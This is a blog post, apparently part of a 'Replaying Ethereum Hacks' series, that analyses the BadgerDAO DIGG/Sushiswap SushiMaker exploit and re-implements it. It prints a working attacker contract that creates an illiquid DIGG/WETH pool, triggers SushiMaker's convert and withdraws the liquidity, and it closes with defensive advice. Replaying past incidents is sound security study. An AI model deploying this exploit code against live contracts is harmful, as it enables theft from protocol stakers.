---
title: Replaying Ethereum Hacks - Sushiswap BadgerDAO's Digg
date: 2021-03-07
image: ./featured.jpg
categories:
  - Tech
  - ETH
  - security
  - replaying-eth
medium:
  - eos
  - Programming
  - blockchain
  - cryptocurrency
  - javascript
steem:
  - eos
  - utopian-io
  - steemdev
  - programming
  - cryptocurrency
---

In this part of the _Replaying Ethereum Hacks_ series, we will look at a vulnerability that is common among **yield aggregators**.
Many of these protocols disclose a function to automatically convert the profits to a different token by trading on a decentralized exchange like Uniswap.
This in and of itself already opens the protocol up to a potential [sandwich attack](/de-fi-sandwich-attacks/).
The profitability of such an attack can be dramatically improved if the attacker can force the protocol to trade in an _illiquid_ pool.

A recent example of such an arbitrage attack could be observed in [BadgerDAO's DIGG <> WBTC](https://www.rekt.news/badgers-digg-sushi/) Sushiswap pool, where the attacker was able to make a profit of 81 ETH.

- [Attacker Address](https://etherscan.io/address/0x51841d9afe10fe55571bdb8f4af1060415003528)
- [_Exploit Trade Transaction_](https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b)

Let's understand the attack by reading the code of the relevant contracts and then replay it by developing a custom attacker contract.

## Background

The [Sushiswap protocol](https://sushi.com/) emerged as a fork of Uniswap. It extends Uniswap's automated market maker with new features like liquidity mining.
The two contracts involved in this attack are:

1. [DIGG <> WTBC Sushiswap Pair](https://etherscan.io/address/0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3#code)
2. [SushiMaker](https://etherscan.io/address/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50#code)

#### Sushiswap Pair

The [Sushiswap pair](https://etherscan.io/address/0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3#code) collects fees whenever anyone adds or removes liquidity. These fees are sent to an account defined in the _Sushiswap Factory_ contract. Note that the fees are sent in the form of **LP tokens** instead of the underlying pool tokens:

```solidity
// simplified for readability
function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
    address feeTo = IUniswapV2Factory(factory).feeTo(); // SushiMaker address
    uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));
    uint rootKLast = Math.sqrt(kLast);
    if (rootK > rootKLast) {
        uint numerator = totalSupply.mul(rootK.sub(rootKLast));
        uint denominator = rootK.mul(5).add(rootKLast);
        uint liquidity = numerator / denominator;
        // mints liquidity tokens for feeTo
        if (liquidity > 0) _mint(feeTo, liquidity);
    }
}
```

The `feeTo` address is taken from the _Sushiswap Factory_ contract and **resolves to the SushiMaker contract**.
The actual fee computation is quite complex but it's essentially just transferring `0.05%` of the traded amount to the fee account. The other `0.25%` go directly to the liquidity providers. The computation is well explained in the [Uniswap V2 white paper](https://uniswap.org/whitepaper.pdf).

> Collecting this 0.05% fee at the time of the trade would impose an additional gas cost on every trade. To avoid this, accumulated fees are collected only when liquidity is deposited or withdrawn. The contract computes the accumulated fees, and mints new liquidity tokens to the fee beneficiary, immediately before any tokens are minted or burned. The total collected fees can be computed by measuring the growth in √k (that is, √x · √y) since the last time fees were collected. - [Uniswap V2 white paper - 2.4 Protocol fee](https://uniswap.org/whitepaper.pdf)

#### SushiMaker

The [SushiMaker contract](https://etherscan.io/address/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50#code) is a _reward contract_ which redistributes all collected fees from all pools to `xSushi` stakers.
Remember that the fees are being sent as **LP tokens** and sending out possibly hundreds of different tokens to each staker is inefficient.
Therefore, the SushiMaker removes liquidity by burning the LP tokens for the pool's underlying tokens, and afterwards **converts both pool tokens to Sushi**.
This immediately raises the question which is at the heart of this exploit:

> Which path should such a trade take?

In our case, the SushiMaker receives `DIGG/WBTC LP tokens` and redeems them for `DIGG` and `WBTC` tokens. The most liquid trade that would net the most profit for `xSushi` stakers would be:

- WBTC: `WBTC -> WETH -> SUSHI`
- DIGG: `DIGG -> WBTC -> WETH -> SUSHI`

Coming up with a general algorithm that finds the most efficient trade path would consume too much gas if done in a contract.
Instead, the SushiMaker allows admins to predefine these trade paths, [called **bridges**](https://github.com/sushiswap/sushiswap/blob/64b758156da6f9bde1d8619f142946b005c1ba4a/contracts/SushiMaker.sol#L212-L213), for each token.

```solidity
// this functions gets called recursively
// _convertStep(token0 = WBTC, token1= DIGG)
// trades WBTC -> ETH, DIGG -> ETH
// __convertStep(ETH, ETH)
// trades ETH -> SUSHI
function _convertStep(
        address token0,
        address token1,
        uint256 amount0,
        uint256 amount1
) internal returns (uint256 sushiOut) {
    if (token0 == token1) {
        uint256 amount = amount0.add(amount1);
        if (token0 == sushi) {
            // ...
        } else if (token0 == weth) {
            sushiOut = _toSUSHI(weth, amount);
        } else {
            // ...
        }
    } /* other cases */ else {
        // eg. DIGG - WBTC
        address bridge0 = bridgeFor(token0);
        address bridge1 = bridgeFor(token1);
        if (bridge0 == token1) {
            // ...
        } else if (bridge1 == token0) {
            // ...
        } else {
            sushiOut = _convertStep(
                bridge0,
                bridge1, // eg. DIGG - WBTC - and bridgeFor(WBTC) = WETH
                _swap(token0, bridge0, amount0, address(this)),
                _swap(token1, bridge1, amount1, address(this))
            );
        }
    }
}
```

The default bridge for each token is the token's **WETH** pair.
However, such a pair does not exist for `DIGG` and a bridge should have been set up such that `DIGG` is traded for `WBTC` first.
This bridge was missing, but the SushiMaker contract still tried to trade in the non-existent `DIGG <> WETH` pair whenever someone called the SushiMaker's `convert` function.
Meaning, all these function calls failed and a large number of tokens accumulated.

#### Exploit

With this knowledge, the exploit idea is clear:

1. Create the missing `DIGG <> WETH` pair.
2. Provide a tiny amount of liquidity, creating a very illiquid pool.
3. Call the `SushiMaker.convert(DIGG, WBTC)` function to trade all accumulated `DIGG` in the shallow pool. The SushiMaker contract ends up trading a large number of `DIGG` tokens for a negligible amount of `WETH`.
4. Rug pull: Withdraw all liquidity again. The attacker receives the `DIGG` from the SushiMaker trade.
5. Sell `DIGG` in the more liquid `DIGG <> WBTC` pair.

Let's reimplement these steps.

## Implementation

An important thing to note is that the `SushiMaker.convert` function performing the trade may only be called by externally-owned accounts (EOAs):

```solidity
modifier onlyEOA() {
    // Try to make flash-loan exploit harder to do.
    require(msg.sender == tx.origin, "SushiMaker: must use EOA");
    _;
}

function convert(address token0, address token1) external onlyEOA() {
    _convert(token0, token1);
}
```

Therefore, we cannot create a contract that performs all exploit steps in a single transaction.
This makes the exploit risky because after having the SushiMaker trade in the illiquid pool, generalized frontrunners or arbitrage bots might pick up on this arbitrage opportunity and front-run the final rug pull.
(It wouldn't be the first time that a generalized frontrunner bot performs a whitehack.)
As we just want to confirm this attack in a local environment, we simply ignore this.

#### Creating the missing WETH pool and adding liquidity

Anyone can create a pair in Sushiswap, so this is straight forward.
To provide liquidity, both tokens of the pair must be acquired, which means we need `WETH` and `DIGG`.
We get `WETH` by depositing `ETH`, and we can get `DIGG` by trading `WETH -> WBTC -> DIGG`.
We call `WBTC` the `wethBridgeToken` in this case as this token, out of the vulnerable `DIGG - WBTC` pair, is the one that already has an existing `WETH` bridge.

```solidity
function createAndProvideLiquidity(
    IERC20 wethBridgeToken, // WBTC
    IERC20 nonWethBridgeToken // DIGG
) external payable returns (IUniswapV2Pair pair) {
    // first acquire both tokens for vulnerable pair
    // we assume one token of the pair has a WETH pair
    // deposit all ETH for WETH
    // trade WETH/2 -> wethBridgeToken -> nonWethBridgeToken
    WETH.deposit{value: msg.value}();
    WETH.approve(address(sushiRouter), msg.value);
    address[] memory path = new address[](3);
    path[0] = address(WETH);
    path[1] = address(wethBridgeToken);
    path[2] = address(nonWethBridgeToken);
    uint256[] memory swapAmounts =
        sushiRouter.swapExactTokensForTokens(
            msg.value / 2,
            0,
            path,
            address(this),
            type(uint256).max
        );
    uint256 nonWethBridgeAmount = swapAmounts[2];

    // create pair
    pair = IUniswapV2Pair(
        sushiFactory.createPair(address(nonWethBridgeToken), address(WETH))
    );

    // add liquidity
    nonWethBridgeToken.approve(address(sushiRouter), nonWethBridgeAmount);
    sushiRouter.addLiquidity(
        address(WETH),
        address(nonWethBridgeToken),
        msg.value / 2, // rest of WETH
        swapAmounts[2], // all DIGG tokens we received
        0,
        0,
        address(this),
        type(uint256).max
    );
}
```

Calling `createAndProvideLiquidity(WBTC, DIGG)` with a tiny amount of ETH sets up the attack and the SushiMaker can be triggered to trade in our illiquid pool.

#### SushiMaker trades in illiquid pool

The `SushiMaker.convert(WBTC, DIGG)` call must be performed from an EOA:

```typescript
await sushiMaker.connect(attackerEOA).convert(WBTC, DIGG)
const diggWethPair = await ethers.getContractAt(
  `IUniswapV2Pair`,
  await sushiFactory.getPair(weth.address, DIGG)
)
// can check if SushiMaker's DIGG is in reserve
const [reserveDigg, reserveWeth] = await diggWethPair.getReserves()
```

#### Rug Pull

Lastly, we let the contract redeem the LP tokens for the underlying tokens again, which should now contain all DIGG tokens that previously accumulated in the SushiMaker contract.

```solidity
function rugPull(
    IUniswapV2Pair wethPair, // DIGG <> WETH
    IERC20 wethBridgeToken // WBTC
) external payable {
    // redeem LP tokens for underlying
    IERC20 otherToken = IERC20(wethPair.token0()); // DIGG
    if (otherToken == WETH) {
        otherToken = IERC20(wethPair.token1());
    }
    uint256 lpToWithdraw = wethPair.balanceOf(address(this));
    wethPair.approve(address(sushiRouter), lpToWithdraw);
    sushiRouter.removeLiquidity(
        address(WETH),
        address(otherToken),
        lpToWithdraw,
        0,
        0,
        address(this),
        type(uint256).max
    );

    // trade otherToken -> wethBridgeToken -> WETH
    uint256 otherTokenBalance = otherToken.balanceOf(address(this));
    otherToken.approve(address(sushiRouter), otherTokenBalance);
    address[] memory path = new address[](3);
    path[0] = address(otherToken);
    path[1] = address(wethBridgeToken);
    path[2] = address(WETH);

    uint256[] memory swapAmounts =
        sushiRouter.swapExactTokensForTokens(
            otherTokenBalance,
            0,
            path,
            address(this),
            type(uint256).max
        );

    // convert WETH -> ETH
    WETH.withdraw(swapAmounts[2]);
    (bool success, ) = msg.sender.call{value: address(this).balance}("");
    require(success, "final transfer failed");
}
```

After receiving `DIGG`, we do a final reverse trade by converting `DIGG -> WBTC -> WETH`.
This nets the attacker a nice profit by trading in the higher liquidity `DIGG <> WBTC` pool.


The full test code is available [in this repo](https://github.com/MrToph/replaying-ethereum-hacks/blob/master/test/sushi-badger-digg.ts).

## Conclusion

The attack we've seen is quite common and also happened in [Yearn's v1 vaults](https://github.com/yearn/yearn-security/blob/master/disclosures/2021-02-04.md), even though it looks a lot more complex. The main differences are that the attacker had to use Curve pools and do several smaller trades to circumvent the slippage parameter set by the function.

When developing contracts that automatically convert tokens, it's important to check what trade paths are taken.
One should ensure that each pair on each trade path has enough liquidity to support the expected amount of tokens.
In addition, tight slippage parameters and/or a max conversion amount per function call can lead to these attacks becoming unprofitable for an attacker.

> This post is part of the [Replaying Ethereum Hacks series](/categories/replaying-eth)
